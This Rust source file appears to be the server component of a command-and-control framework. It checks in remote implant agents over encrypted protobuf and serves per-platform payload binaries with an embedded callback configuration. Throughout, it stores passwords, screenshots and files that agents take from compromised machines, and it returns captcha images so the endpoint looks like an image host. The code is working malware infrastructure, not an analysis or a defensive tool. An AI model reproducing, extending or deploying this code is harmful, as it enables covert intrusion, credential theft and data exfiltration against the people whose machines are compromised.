use crate::models;
use crate::protos;
use crate::core;
use crypto::AesCrypt;


use std::sync::Arc;
use std::collections::{HashMap, VecDeque};
use std::io::{Read, Write};
use std::time::{SystemTime, UNIX_EPOCH};
use std::net::{IpAddr, Ipv4Addr, SocketAddr};

use prost::Message;
use sea_orm::{Database, DatabaseConnection};
use sea_orm::{ActiveModelTrait, EntityTrait, ColumnTrait, QueryFilter, Set};
use poem::listener::TcpListener;
use poem::session::{Session, ServerSession, CookieConfig, MemoryStorage};
use poem::{Request, Response, Route, Server, EndpointExt, IntoResponse};
use poem::web::{Path, Data, RemoteAddr};
use poem::{handler, get, post};
use poem::http::StatusCode;
use captcha_rs::CaptchaBuilder;

fn is_safe(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-'))
}

#[handler]
async fn npc_handler(
    Path((route,uri)): Path<(String,String)>, 
    sess: &Session,
    body: Option<Vec<u8>>,
    app: Data<&core::AppState>,
    addr: &RemoteAddr,
) -> anyhow::Result<impl IntoResponse> {

    if let Some(proj) = app.get_project_by_route(&route).await {
        // /manjusaka/js/js.KvWzsV.js /manjusaka/KvWzsV.jpg  /manjusaka/9111

        let crypt = AesCrypt::new(&proj.enckey)?; // 直接退出

        let strmod = uri.parse::<u16>().unwrap_or(
            utils::getstrmod(
                uri.split("/")
                    .last()
                    .unwrap_or("")
                    .rsplit(".")
                    .nth(1)
                    .unwrap_or("")));

        log::debug!("strmod {}",strmod);
        
        let mut res_data = Vec::new();

        match strmod {
            9000..9999 => {
                
                let mut req_agent: Option<protos::nps::Agent> = None;
                let mut res_event: Option<protos::nps::AgentEvent> = None;

                //如果有sessionid则 直接取event 没有则重新初始化
                match sess.get::<protos::nps::Agent>("AGENT"){
                    Some(agent) => {
                        if app.agent_heartbeat(&agent.id).await{//手动删除 重新上线
                            if let Some(event) = app.get_event(&agent.id).await{
                                res_event = Some(event);
                            }
                        }else{
                            let mut config = protos::nps::Config::default();
                            config.action = 1;
                            let mut event = protos::nps::AgentEvent::default();
                            event.enumof = Some(protos::nps::agent_event::Enumof::Conf(config));
                            res_event = Some(event);
                        }
                        req_agent = Some(agent);
                    },
                    None => { //nps重启后重新上线
                        let mut config = protos::nps::Config::default();
                        config.action = 1;
                        let mut event = protos::nps::AgentEvent::default();
                        event.enumof = Some(protos::nps::agent_event::Enumof::Conf(config));
                        res_event = Some(event);
                    }
                }

                // 如果有内容则解析  body为event
                if let Some(v) = body {
                    if let Ok(c) = crypt.decrypt(&v){
                        let mut cursor = std::io::Cursor::new(c);
                        if let Ok(event) = protos::nps::AgentEvent::decode(&mut cursor){
                            log::debug!("req_event {:?}",event);
                            match event.enumof {
                                Some(protos::nps::agent_event::Enumof::Init(ref agent)) =>  { //npc初始化
                                    let mut agent = agent.clone();
                                    agent.target = proj.route;
                                    agent.note = proj.name;
                                    agent.updateat = utils::timestamp();
                                    agent.internet = addr
                                        .as_socket_addr()
                                        .unwrap_or(&SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)), 8080))
                                        .ip()
                                        .to_string();   

                                    let mut agentlist = protos::nps::AgentList::default();
                                    agentlist.status = "create".to_string();
                                    agentlist.agents = vec![agent.clone()];
                                    let mut agentevent = protos::nps::AgentEvent::default();
                                    agentevent.enumof =  Some(protos::nps::agent_event::Enumof::List(agentlist));
                                    let _ = app.broadcast(agentevent).await;// 推送上线提示
                                    let _ = app.add_agent(agent.clone()).await;
                                    sess.set("AGENT",&agent); //sess 不能放在子线程里面

                                    log::info!("npc1 new {:?}",agent);

                                },
                                _ => {
                                    if let Some(agent) = req_agent {
                                        let proj1 = proj.clone();
                                        let app1 = app.clone();
                                        tokio::spawn(async move{
                                            if let Err(e) = npc_event(proj1,agent,event,&app1).await{
                                                log::error!("npc_event err {}",e);
                                            }
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
                
                if let Some(event) = res_event {
                    let mut ret = Vec::new();
                    if event.encode(&mut ret).is_ok(){
                        if let Ok(e) = crypt.encrypt(&ret.clone()){
                            log::debug!("res_event {:?}",event);
                            res_data = e;
                        }
                    }
                };
            },
            1000..2000 => {
                let mut dna     = protos::nps::Config::default();
                dna.id          = utils::uuid(); //使得生成的hash不一致
                dna.callback1   = format!("{}/{}/<action>.png",proj.callback1,proj.route);
                dna.enckey      = proj.enckey;
                dna.proxy       = proj.proxy;
                dna.headers     = proj.domain;
                dna.config      = proj.config;
                log::info!("Create DNA {:?}", dna);
                let mut buf = Vec::new();
                if dna.encode(&mut buf).is_ok(){
                    if let Ok(crypt) = AesCrypt::new("DNA"){
                        if let Ok(out) = crypt.encrypt(&buf){
                            let msg = utils::b64encode(&out);
                            log::info!("DNA INFO {:?}", msg);
                            let data = payload_download(strmod);
                            let pattern = ".".repeat(300);
                            let replace = format!("{}{}",msg,".".repeat(300-msg.len()));
                            res_data = utils::replace_bytes(&data,pattern.as_bytes(),replace.as_bytes());
                        }
                    }
                }
            },
            _ => { //加入图片
                let captcha = CaptchaBuilder::new()
                    .length(4)
                    .width(120)
                    .height(50)
                    .dark_mode(false)
                    .complexity(3) // min: 1, max: 10
                    .compression(20) // min: 1, max: 99
                    .build();
                let _ = captcha.image.write_to(
                    &mut std::io::Cursor::new(
                        &mut res_data), 
                    image::ImageFormat::Png); 
            }
        };

        Ok(res_data.into_response())

    }else{
        Ok(Response::builder()
            .status(StatusCode::NOT_FOUND)
            .body("404 not found"))
    }
}

 
async fn npc_event(
    proj:   models::projects::Model,
    agent:  protos::nps::Agent, 
    event:  protos::nps::AgentEvent, 
    app:    &core::AppState,
) -> anyhow::Result<()> {
    let _ = app.send_msg(event.clone()).await?;

    match event.enumof {
        Some(protos::nps::agent_event::Enumof::Plugin(req)) => { 
            match req.act.as_str(){
                "ss" => {
                    let plugin = protos::nps::Plugin{
                        act: "ex".to_string(),
                        .. req
                    };

                    let mut plevent = protos::nps::AgentEvent::default();
                    plevent.id = event.sendto.clone();
                    plevent.sendto = event.id.clone();
                    plevent.enumof = Some(protos::nps::agent_event::Enumof::Plugin(plugin));
                    app.add_event(plevent).await; 
                },
                "ld" => {         
                    let mut plugin = protos::nps::Plugin{
                        act: "ld".to_string(),
                        .. req.clone()
                    };

                    if !req.arch.is_empty() && !is_safe(&req.arch) || !is_safe(&req.name) || !is_safe(&agent.platform) || !is_safe(&agent.arch) {
                        log::debug!("{:?} {:?}",req,agent);
                        return Ok(());
                    }

                    let mut data = Vec::new();
                    let path = if req.arch.is_empty(){
                        let path = format!("{}.{}.{}.dat",req.name,agent.platform,agent.arch); 
                        std::path::Path::new("./payloads").join(path)
                    }else{
                        let path = format!("{}.{}.{}.{}",req.name,agent.platform,agent.arch,req.arch); 
                        std::path::Path::new("./plugins").join(path)
                    };
                    log::info!("{} load {:?}", agent.id, path);
                    let mut file = std::fs::File::open(path)?;
                    let _ = file.read_to_end(&mut data)?;

                    if req.name.as_str() == "npc2" {
                        plugin.entry = "plugmain".to_string();
                        if let Ok(Some(listen)) = models::prelude::Listens::find_by_id(&proj.listen).one(&app.conn).await {
                            let mut dna     = protos::npc2::Config::default();
                            dna.id          = agent.id.clone(); //使得生成的hash不一致
                            dna.addr        = listen.onlineaddr;
                            dna.enckey      = listen.enckey;
                            dna.ctype       = listen.transport;
                            dna.enctype     = listen.noise;
                            dna.proxy       = listen.proxyaddr;
                            log::info!("Create DNA {:?}", dna);
                            let mut buf = Vec::new();
                            if dna.encode(&mut buf).is_ok(){
                                if let Ok(crypt) = AesCrypt::new("DNA"){
                                    if let Ok(out) = crypt.encrypt(&buf){
                                        let msg = utils::b64encode(&out);
                                        log::info!("DNA INFO {:?}", msg);
                                        let pattern = ".".repeat(300);
                                        let replace = format!("{}{}",msg,".".repeat(300-msg.len()));
                                        data = utils::replace_bytes(&data,pattern.as_bytes(),replace.as_bytes());
                                    }
                                }
                            }
                        }
                    }

                    plugin.data = data;

                    let mut plevent = protos::nps::AgentEvent::default();
                    plevent.id = event.sendto.clone();
                    plevent.sendto = event.id.clone();
                    plevent.enumof = Some(protos::nps::agent_event::Enumof::Plugin(plugin));

                    app.add_event(plevent).await;
                },
                "dd" => {
                    if req.name.as_str() == "getpass" {
                        let models: Vec<models::passresult::Model> = serde_json::from_slice(&req.data)?;
                        for model in models {
                            let existing = models::passresult::Entity::find()
                                .filter(models::passresult::Column::Target.eq(&proj.id))
                                .filter(models::passresult::Column::Username.eq(&model.username))
                                .filter(models::passresult::Column::Password.eq(&model.password))
                                .filter(models::passresult::Column::Passtype.eq(&model.passtype))
                                .one(&app.conn)
                                .await?;
                            if !existing.is_some() {
                                let mut active_model = models::passresult::ActiveModel{
                                    id :        Set(utils::uuid()),
                                    target:     Set(proj.id.clone()),
                                    agent:      Set(format!("{}@{}",agent.username,agent.intranet)),
                                    username:   Set(model.username),
                                    password:   Set(model.password),
                                    passtype:   Set(model.passtype),
                                    passfrom:   Set(model.passfrom),
                                    .. Default::default()
                                };
                                active_model.insert(&app.conn).await?;
                            }
                        }
                    }
                }
                _ => {}
            }
        },
        Some(protos::nps::agent_event::Enumof::Action(req)) => { //
            match req.act.as_str(){
                "cr" => { //截屏
                    let id = utils::uuid();
                    let path = std::path::Path::new("./data").join(&id);
                    let mut file = std::fs::File::create(path)?;
                    file.write_all(&req.data)?;

                    let mut active_model = models::fileresult::ActiveModel{
                            id :        Set(id.clone()),
                            target:     Set(proj.id),
                            agent:      Set(format!("{}@{}",agent.username,agent.intranet)),
                            fileauth:   Set(utils::uuid()),
                            filepath:   Set(id),
                            filename:   Set(format!("NPU_SCREEN-{}.png",utils::format_timestamp())),
                            filesize:   Set(req.data.len() as i64),
                            .. Default::default()
                    };
                    active_model.insert(&app.conn).await?;
                },
                "fr" => { //文件读取
                    let id = utils::uuid();

                    let existing = models::fileresult::Entity::find()
                        .filter(models::fileresult::Column::Target.eq(&proj.id))
                        .filter(models::fileresult::Column::Filepath.eq(&req.path))
                        .filter(models::fileresult::Column::Filename.eq(&req.name))
                        .filter(models::fileresult::Column::Filesize.eq(req.data.len() as i64))
                        .one(&app.conn)
                        .await?;

                    if !existing.is_some() { // 不存在才写入
                        let path = std::path::Path::new("./data").join(&id);
                        let mut file = std::fs::File::create(path)?;
                        file.write_all(&req.data)?;
                        
                        let mut active_model = models::fileresult::ActiveModel{
                                id :        Set(id),
                                target:     Set(proj.id),
                                agent:      Set(format!("{}@{}",agent.username,agent.intranet)),
                                fileauth:   Set(utils::uuid()),
                                filepath:   Set(req.path),
                                filename:   Set(req.name),
                                filesize:   Set(req.data.len() as i64),
                                .. Default::default()
                        };
                        active_model.insert(&app.conn).await?;
                    }
                },
                _ => {}
            }
        },
        _ => {}
    }

    Ok(())
}


fn payload_download(strmod: u16) -> Vec<u8> {

    let strmod_str = format!("{:04}", strmod);
    
    let name_digit = strmod_str
        .chars()
        .nth(1)
        .and_then(|c| c.to_digit(10))
        .unwrap_or(0) as u8;
    
    let arch_digit = strmod_str
        .chars()
        .nth(2)
        .and_then(|c| c.to_digit(10))
        .unwrap_or(0) as u8;
    
    let os_digit = strmod_str
        .chars()
        .nth(3)
        .and_then(|c| c.to_digit(10))
        .unwrap_or(0) as u8;

    let name = match name_digit {
        1 => "npc1",
        2 => "npc2",
        3 => "buut",
        4 => "diwe",
        _ => ""
    };

    let arch = match arch_digit{
        1 => "x86_64",
        2 => "x86",
        3 => "aarch64",
        4 => "arm",
        5 => "mips64", 
        6 => "mips",
        7 => "loongarch64", 
        _ => ""
    };

    let os = match os_digit{
        1 => "windows",
        2 => "linux",
        3 => "macos",
        4 => "android",
        5 => "ios", 
        6 => "ohos", 
        _ => ""
    };

    let path = format!("./payloads/{}.{}.{}.dat", name, os, arch);

    log::info!("read payload path {}",path);

    let mut buf = Vec::new();

    if let Ok(mut file) = std::fs::File::open(&path){
        let _ = file.read_to_end(&mut buf);
    }
    
    buf
}

pub async fn start(addr: &str, app: core::AppState) {
    let addr_owned = addr.to_owned();
    tokio::spawn(async move{
        let addr = TcpListener::bind(addr_owned);
        let route = Route::new()
            .at("/:route/*uri", get(npc_handler).post(npc_handler))
            .with(
                ServerSession::new(
                    CookieConfig::default().name("SESSIONID").secure(false), //必须显示声明secure为false 不然无法初始化
                    MemoryStorage::new()))
            .data(app);
        Server::new(addr).run(route).await.unwrap(); //直接退出
    });
}
 
